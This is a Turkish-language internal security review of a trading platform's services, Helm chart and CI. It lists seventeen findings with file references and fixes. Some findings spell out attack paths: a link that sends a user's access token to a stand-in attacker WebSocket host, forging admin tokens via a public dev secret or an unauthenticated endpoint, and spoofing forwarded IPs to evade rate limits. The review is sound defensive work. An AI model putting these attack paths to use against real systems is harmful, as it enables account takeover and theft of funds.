# 06 — Güvenlik incelemesi (main @ `1ef6920`, 4 Eki 2026)

Kapsam: `services/identity`, `services/client-gateway` (kimlik doğrulama), `services/core-engine` (admin API, RBAC, CORS, dev-auth), sır yönetimi, `infra/docker/*`, `deploy/helm/fxvps`, `.github/workflows/*`, `apps/terminal`, `apps/backoffice`, `apps/desktop`.
Yöntem: kaynak okuma (statik). Çalışan sistemde sızma testi yapılmadı. **Bu PR hiçbir bulguyu düzeltmez** (başka PR'lar aynı dosyalarda açık); her bulgu ayrı bir işe dönüştürülmelidir.

> **Durum (fix/security-findings):** G1–G13 ve G16 düzeltildi/kısmi; ayrıntı ve kalanlar `docs/07-guvenlik-duzeltmeleri.md`.

Önem: **Kritik** (üretimde doğrudan hesap/para ele geçirme) · **Yüksek** · **Orta** · **Düşük** · **Bilgi**.

## Özet tablo

| # | Önem | Bileşen | Bulgu |
|---|---|---|---|
| G1 | Kritik | client-gateway + Helm | Anahtar verilmezse herkese açık DEV HS256 sırrına sessizce düşülüyor; Helm'de sır yok |
| G2 | Kritik | core-engine | `CORE_DEV_AUTH=1` iken kimliksiz `/auth/dev-token` gerçek sırla **admin** jetonu basıyor; `sub` istemciden → dört göz atlatılır |
| G3 | Yüksek | terminal | `?api=ws&url=<saldırgan>` bağlantısı, identity erişim jetonunu saldırganın WS sunucusuna gönderir |
| G4 | Yüksek | identity | Tek posta sağlayıcısı `LogMailer`: doğrulama/parola sıfırlama bağlantıları log'a yazılıyor |
| G5 | Yüksek | core-engine | Admin JWT doğrulamasında `iss`/`aud` yok, MFA (`amr`) şartı yok, 30 sn leeway |
| G6 | Yüksek | backoffice | Admin/dealer jetonu `localStorage`'da; SSE jetonu URL sorgusunda; CSP yok |
| G7 | Orta | identity | `X-Forwarded-For`'un en soldaki (istemci denetimli) değeri alınıyor → IP hız sınırı atlatılır |
| G8 | Orta | identity | Kimlikli uçlar (TOTP disable/confirm, admin) hız sınırı dışında; TOTP kaba kuvvet sayacı yok |
| G9 | Orta | client-gateway | Jeton süresi bağlantı boyunca yeniden denetlenmiyor; bağlantı/IP sınırı yok |
| G10 | Orta | Helm | Yalnız Ingress politikası (egress serbest); `/metrics` herkese açık portta; `secretRef optional: true` |
| G11 | Orta | Helm | `runAsNonRoot` + distroless `nonroot` (sayısal olmayan USER) → pod başlamaz; core-engine verisi kalıcı birimde değil |
| G12 | Orta | CI | Eylemler SHA ile sabitlenmemiş; `ci.yml`'de `permissions` yok; PR'larda `packages: write` |
| G13 | Düşük | static-web | nginx'te CSP / `frame-ancestors` / HSTS yok |
| G14 | Düşük | identity | Erişim jetonu oturum iptalinden / rol düşürmeden 5 dk etkilenmez; bootstrap admin rolü kayıtta verilir |
| G15 | Düşük | core-engine | `CORE_CORS_ORIGINS=*` kabul ediliyor |
| G16 | Düşük | identity | Anahtarlı hız sınırlayıcı (`governor` keyed) hiç budanmıyor → bellek büyümesi |
| G17 | Bilgi | Docker | Taban imajlar etiketle (digest değil), `cargo-chef:latest-rust-*` |

## Ayrıntılar

### G1 — Kritik: client-gateway DEV anahtarına sessiz düşüş
- `services/client-gateway/src/auth.rs:25` herkese açık sabit `DEV_HS256_SECRET`; `auth.rs:203` hiçbir anahtar ortam değişkeni yoksa ona düşer.
- `services/client-gateway/src/main.rs:48-53` yalnızca `warn!` basar, `--demo` olmadan da çalışmayı sürdürür.
- `deploy/helm/fxvps/values.yaml:59` client-gateway için `existingSecret: ""`, `env` içinde `FXVPS_JWT_JWKS_URL` yok. Chart bu hâliyle etkinleştirilirse herkes depodaki sabitle `accounts: ["<herhangi>"]` jetonu imzalayıp her hesapta emir verebilir.
- **Öneri:** DEV anahtarını yalnız `--demo` (veya açık `FXVPS_DEV_AUTH=1`) ile kabul et, aksi hâlde başlatmayı reddet. Helm'e `FXVPS_JWT_JWKS_URL`, `FXVPS_JWT_ISSUER`, `FXVPS_JWT_AUDIENCE` zorunlu değerlerini ekle (`required` şablon fonksiyonu).

### G2 — Kritik: core-engine `/auth/dev-token`
- `services/core-engine/src/admin/routes.rs:145-165`: kimlik doğrulamasız uç, istenen **her rolü** (admin dahil) ve istenen `sub`'ı 12 saatlik jetona basar.
- `services/core-engine/src/admin/auth.rs:224-238`: `CORE_DEV_AUTH=1` iken `CORE_JWT_HS256_SECRET` verilmişse dev imzalayıcı **gerçek sırrı** kullanır; yani üretim sırrıyla geçerli admin jetonu herkese açıktır. RS256 anahtarı verilse bile dev imzalayıcı yanına eklenir.
- `routes.rs:548` dört göz kuralı yalnız `sub` eşitsizliğine bakar; dev-token ile iki farklı `sub` almak bedavadır → bakiye onayı tek kişiyle yapılır.
- **Öneri:** dev-auth'u derleme özelliğine (`--features dev-auth`) taşı, sürüm imajında derleme; açıkken yalnız loopback'ten istek kabul et; dev imzalayıcı asla gerçek sırrı kullanmasın; `CORE_DEV_AUTH` ile `CORE_JWT_*` birlikte verilirse başlatmayı reddet.

### G3 — Yüksek: terminal'de jeton sızdırma bağlantısı
- `apps/terminal/src/store/connection.ts:63-65`: `?api=ws&url=...` sorgusundaki herhangi bir `ws(s)://` adresi kabul edilip sessionStorage'a yazılıyor.
- `apps/terminal/src/store/api.ts:27`: yapıştırılmış jeton yoksa `sessionToken()` (identity erişim jetonu) bu adrese `Auth` çerçevesinde gönderiliyor.
- Saldırı: kurbana `https://terminal.../?api=ws&url=wss://kotu.example/ws` bağlantısı → oturum açık kullanıcının erişim jetonu (5 dk, ama yenileme her bağlantıda yenisini gönderir) saldırgana gider; saldırgan gerçek gateway'de emir verir.
- **Öneri:** üretim derlemesinde `url` parametresini kapat veya derleme zamanı izin listesi (`VITE_ALLOWED_GATEWAYS`) uygula; identity jetonunu yalnız izinli gateway kökenlerine gönder.

### G4 — Yüksek: identity posta = log
- `services/identity/src/main.rs:48-54` her zaman `LogMailer` kullanır (TODO). `services/identity/src/mail.rs:46-52` doğrulama ve **parola sıfırlama bağlantısını** `warn!` ile yazar (+ isteğe bağlı dosya).
- Log erişimi olan herkes (log toplayıcı, destek) herhangi bir hesabın parolasını sıfırlayabilir (`forgot_password` → log → `reset_password`; `http.rs:758-779` aynı zamanda e-postayı doğrulanmış sayar).
- **Öneri:** gerçek `Mailer` (SMTP/sağlayıcı) ve `DATABASE_URL` verilmişken `LogMailer`'ı reddet; log'a bağlantı değil yalnız alıcı/konu yaz.

### G5 — Yüksek: core-engine admin JWT doğrulaması
- `services/core-engine/src/admin/auth.rs:249-266`: `Validation` yalnız `exp`,`sub` ister; `iss`/`aud` denetlenmez, `leeway = 30`. Aynı anahtarla başka amaçla imzalanmış (ör. HS256 sırrı paylaşılırsa client-gateway jetonu) jetonlar kabul edilebilir.
- Rol (`role`) tekil alan ve identity'nin `roles` dizisiyle uyumsuz; MFA şartı (`amr` içinde `otp`/`hwk`/`mfa`) yok — para hareketi yetkisi olan roller tek faktörle girer.
- **Öneri:** identity JWKS (RS256) + `iss`/`aud` zorunlu; `balance.*`, `users.*`, `settings.*` için `amr` MFA şartı; leeway ≤ 5 sn.

### G6 — Yüksek: back office jeton saklama
- `apps/backoffice/src/lib/auth.ts:50,62`: bearer jeton `localStorage`'da (XSS = kalıcı admin jetonu hırsızlığı, sekme kapansa da kalır).
- `apps/backoffice/src/lib/api/http.ts:113` + `services/core-engine/src/admin/stream.rs:21-29`: SSE jetonu `?access_token=` sorgusunda → ters vekil/erişim loglarına düşer.
- `infra/docker/nginx-spa.conf` CSP göndermez (bkz. G13); XSS'e karşı ikinci savunma hattı yok.
- **Öneri:** jetonu yalnız bellekte tut + identity HttpOnly yenileme çerezi (terminal'deki gibi); SSE için kısa ömürlü tek kullanımlık akış bileti ya da `fetch` tabanlı akış; katı CSP.

### G7 — Orta: `X-Forwarded-For` güveni
- `services/identity/src/http.rs:112-124`: `IDENTITY_TRUST_PROXY` açıkken XFF'nin **ilk** girdisi alınır; istemci bu başlığı kendisi koyabilir, vekil sona ekler. Her istekte farklı sahte IP → `rate_limit` (`http.rs:236-250`) ve denetim kaydındaki IP anlamsızlaşır.
- **Öneri:** güvenilen vekil sayısı (`IDENTITY_TRUSTED_PROXY_HOPS`) kadar **sağdan** say; ya da vekilin koyduğu tek başlığı (`X-Real-IP`) kullan.

### G8 — Orta: hız sınırı kapsamı ve TOTP
- `http.rs:194-231`: hız sınırı yalnız `limited` alt yönlendiricide; `/v1/2fa/totp/disable` (`http.rs:1105-1124`), `/v1/2fa/totp/confirm`, `/v1/admin/*` sınırsız. `totp_disable` başarısız denemeyi saymaz (`register_failure` çağrılmaz). Çalınmış 5 dakikalık erişim jetonuyla 2FA kaldırma için sınırsız kod denemesi yapılabilir (her 30 sn'de ~3/10⁶ isabet; paralel isteklerle olası).
- Admin uçları (`http.rs:151-171`) MFA (`amr`) şartı aramaz.
- **Öneri:** tüm `/v1/*`'e kullanıcı başına sınır; TOTP hatalarını `failed_logins`'e say; 2FA kaldırmak için parola + kod iste; admin için `amr` MFA şartı.

### G9 — Orta: client-gateway oturum süresi ve kaynak sınırları
- `services/client-gateway/src/conn.rs:232` `exp` yalnız `AuthOk`'ta istemciye bildirilir; bağlantı süresince yeniden denetlenmez → süresi dolmuş/iptal edilmiş jetonla açık bağlantı süresiz emir verebilir.
- Toplam / IP başına bağlantı sınırı yok (`conn.rs:104` yalnız metrik). Kimliksiz bağlantılar 5 sn (`auth_timeout_ms`) tutulabilir; çok sayıda soket açmak kolay.
- WebSocket yükseltmede `Origin` denetimi yok (`lib.rs:33-38`). Kimlik çerezle değil çerçevedeki jetonla olduğu için CSWSH riski düşük; yine de izin listesi önerilir.
- **Öneri:** `exp` anında bağlantıyı `UNAUTHENTICATED` ile kapat veya yeniden `Auth` iste; IP başına ve küresel bağlantı tavanı; `Origin` izin listesi.

### G10 — Orta: Helm ağ politikası
- `deploy/helm/fxvps/templates/networkpolicy.yaml:13` yalnız `Ingress`; egress serbest (ele geçirilmiş pod her yere bağlanır; FIX kimlik bilgileri dışarı sızabilir).
- `values.yaml:52,60`: client-gateway `metricsPort: http` ve `ingressFrom: ["*"]` → `/metrics` internete açık (hesap/bağlantı sayıları).
- `templates/deployment.yaml:49` `secretRef ... optional: true`: sır eksikse pod sessizce DEV varsayılanlarıyla (G1, FIX `demo` parolası — `deploy/compose/docker-compose.yml:123-124`) kalkar.
- identity servisi chart'ta hiç yok.
- **Öneri:** varsayılan `Egress` reddi + DNS/NATS/LP/Postgres izinleri; metrikleri ayrı porta al; `optional: false`; identity'yi chart'a ekle.

### G11 — Orta: Helm securityContext / kalıcılık
- `templates/deployment.yaml:25-27` `runAsNonRoot: true` ama `runAsUser` yok; imajlar `USER nonroot:nonroot` (`infra/docker/*.Dockerfile`, ör. `client-gateway.Dockerfile:27`) sayısal değil → kubelet doğrulayamaz, `CreateContainerConfigError`. (Statik web imajı `USER 101` ile sorunsuz.)
- `readOnlyRootFilesystem: true` ve yalnız `/tmp` bağlanıyor; core-engine `CORE_DATA_DIR=/home/nonroot/data` (`core-engine.Dockerfile:32-34`) birimsiz → yazamaz ya da (yazabilseydi) yeniden başlatmada **defter/journal kaybı**. Bütünlük riski.
- **Öneri:** `runAsUser/runAsGroup: 65532`, `fsGroup`; core-engine için StatefulSet + PVC.

### G12 — Orta: CI tedarik zinciri
- Tüm iş akışları eylemleri etiketle çağırır (`actions/checkout@v4`, `dtolnay/rust-toolchain@stable`, `tauri-apps/tauri-action@v0` …), SHA sabitlemesi yok.
- `.github/workflows/ci.yml` dosyasında `permissions:` yok → depo varsayılanı (çoğu zaman `contents: write`) geçerli.
- `docker.yml:10-12` iş akışı düzeyinde `packages: write`; `pull_request` tetiklemesinde de verilir (itme `docker.yml` içinde `event_name != 'pull_request'` ile engelli, ama yetki gereksiz). Fork PR'larında GitHub zaten salt okunur yapar; aynı depo dallarında değil.
- **Öneri:** eylemleri tam SHA'ya sabitle (+ Dependabot), `ci.yml`'e `permissions: contents: read`, `packages: write`'ı yalnız push işine ver.

### G13 — Düşük: statik web başlıkları
- `infra/docker/nginx-spa.conf:6-7` yalnız `nosniff` ve `Referrer-Policy`. CSP, `frame-ancestors` (clickjacking — emir düğmeleri), HSTS, `Permissions-Policy` yok. `/assets/` bloğundaki `add_header` üst düzey başlıkları geçersiz kılar (nginx kalıtımı) → varlıklarda `nosniff` de düşer.
- Masaüstü (`apps/desktop/src-tauri/tauri.conf.json:32`) iyi bir CSP'ye sahip; `connect-src wss:` her WSS hedefine izin verir (G3 ile birleşir).
- **Öneri:** `default-src 'self'; connect-src 'self' wss://<gateway> https://<identity>; frame-ancestors 'none'` + HSTS; başlıkları her `location`'da tekrarla.

### G14 — Düşük: identity jeton ömrü / bootstrap admin
- Erişim jetonu durumsuz (`lib.rs:132-138`); `revoke-all`, rol düşürme (`http.rs:1386-1410`) ve kilitleme 5 dk boyunca etkisiz. Kabul edilebilir ama admin rolleri için kısa TTL (≤ 60 sn) önerilir.
- `http.rs:639`: `IDENTITY_BOOTSTRAP_ADMINS` listesindeki e-posta kayıtta doğrudan `admin` alır; giriş için e-posta doğrulaması gerektiği için düşük risk, ama bootstrap'ı tek seferlik CLI komutuna taşımak daha iyidir.

### G15 — Düşük: core-engine CORS `*`
- `services/core-engine/src/admin/mod.rs:204-205` `CORE_CORS_ORIGINS=*` ile her kökene izin verir. Kimlik çerez değil bearer olduğundan sınırlı; üretimde `*`'ı reddet.

### G16 — Düşük: sınırlayıcı belleği
- `services/identity/src/lib.rs:107` keyed `governor` sınırlayıcı; `retain_recent()` hiçbir yerde çağrılmıyor → sahte IP'lerle (G7) sınırsız anahtar birikir. Periyodik `retain_recent` + `shrink_to_fit` ekle.

### G17 — Bilgi: imaj sabitleme
- `infra/docker/*.Dockerfile`: `lukemathwalker/cargo-chef:latest-rust-…`, `gcr.io/distroless/cc-debian12:nonroot`, `node:…`, `nginxinc/nginx-unprivileged:1.27-alpine` etiketle; digest sabitleme + SBOM/imza (cosign) önerilir. `.dockerignore`'lar `.env`, `*.pem`, `*.key`'i dışlıyor (iyi).

## Olumlu gözlemler
- identity: argon2id, kullanıcı yokken sahte doğrulama (zamanlama), sabit zamanlı karşılaştırma, TOTP adım yeniden kullanımı engeli, yenileme jetonu rotasyonu + yeniden kullanım tespitinde aile iptali, `HttpOnly; SameSite=Strict; Secure` çerez + CSRF başlığı + Origin denetimi, kayıt/şifre sıfırlamada e-posta numaralandırma koruması, servis jetonu ≥ 32 karakter.
- client-gateway: hesap başına emir hız sınırı, `may_access` ile hesap yetkisi, çerçeve boyutu sınırı, `iss`/`aud` yapılandırılabilir, JWKS rotasyonu.
- core-engine: izin tabanlı RBAC (bilinmeyen izin reddedilir), dört göz eşiği, legacy uçlar yalnız admin.
- Terminal: erişim jetonu bellekte, yenileme HttpOnly çerezde, `?token=` adres çubuğundan siliniyor.
- Compose: tüm portlar `127.0.0.1`'e bağlı. Helm: `automountServiceAccountToken: false`, `drop: [ALL]`, seccomp.

## Önerilen sıra
1. G1, G2 (üretim öncesi zorunlu, küçük değişiklikler).
2. G3, G4, G5, G6.
3. G7–G12 sertleştirme dalgası; G13–G17 bakım.
